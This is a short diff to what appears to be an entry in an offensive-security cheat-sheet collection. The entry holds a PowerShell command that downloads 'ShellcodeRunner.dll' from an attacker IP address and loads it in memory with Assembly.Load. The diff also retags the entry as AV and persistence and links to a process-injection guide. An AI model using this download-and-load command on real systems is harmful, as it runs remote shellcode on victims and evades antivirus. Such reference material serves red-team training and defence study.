@@ -74,8 +74,9 @@ command: |
             }
         }
     }
-
-    $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.13.37/ShellcodeRunner.dll')
+    ```
+    ```
+    $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.21/ShellcodeRunner.dll')
 
     $assem = [System.Reflection.Assembly]::Load($data)
     or (for local file)
@@ -92,14 +93,13 @@ items:
     - Shell
 
 services:
-    - 
+    - AV
 OS:
     - Windows
 attack_types:
-    - Lateral Movement
+    - Persistence
 references:
-    - https://medium.com/iostrap/how-to-transfer-files-between-servers-using-netcat-d8bc13eebea
-    - https://linux.die.net/man/1/nc
+    - https://ppn.snovvcrash.rocks/red-team/maldev/code-injection/process-injectors#c-dll-via-win32-api
 --- 
 
 
